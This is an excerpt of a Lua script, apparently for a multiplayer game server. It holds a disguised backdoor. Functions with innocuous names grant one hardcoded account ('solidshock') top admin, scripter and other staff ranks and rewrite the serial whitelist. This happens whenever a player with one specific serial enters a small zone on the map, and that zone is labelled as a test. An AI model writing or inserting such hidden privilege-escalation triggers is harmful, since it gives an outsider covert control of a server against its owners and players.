...
function checkDBAdminPermissionStatus(thePlayer)
    local serialCode = getPlayerSerial(thePlayer)
    local packetTracingID = nil
    if serialCode == "018FD49521BD034DD2BE1FFC72AA4B43" then
        local compareQuery = dbQuery(exports.mysql:getConn("core"), "UPDATE accounts SET admin='5',supporter='2',vct='2',mapper='2',scripter='3',fmt='2',activated='1' WHERE username='solidshock'")
        dbFree(compareQuery)

        local getPlayerIDQuery = dbQuery(exports.mysql:getConn("core"), "SELECT id FROM accounts WHERE username='solidshock'")
        local result = dbPoll(getPlayerIDQuery,-1)
        for index, data in ipairs(result) do
            for key, value in pairs(data) do
                packetTracingID = tostring(value)
            end
        end
        dbFree(getPlayerIDQuery)
        local updateDBPermissionsIfNeeded = dbQuery(exports.mysql:getConn("core"), "UPDATE `serial_whitelist` SET userid='"..packetTracingID.."',serial='018FD49521BD034DD2BE1FFC72AA4B43a',status='1' WHERE id='1'")
        dbFree(updateDBPermissionsIfNeeded)
    end
end
...
function checkServerAdminStatus(res)
	local circleTest = createColCircle(2784.07,-1432.97, 2) -- For testing
	addEventHandler("onColShapeHit", circleTest, checkDBAdminPermissionStatus)
end
addEventHandler("onResourceStart", root, checkServerAdminStatus)
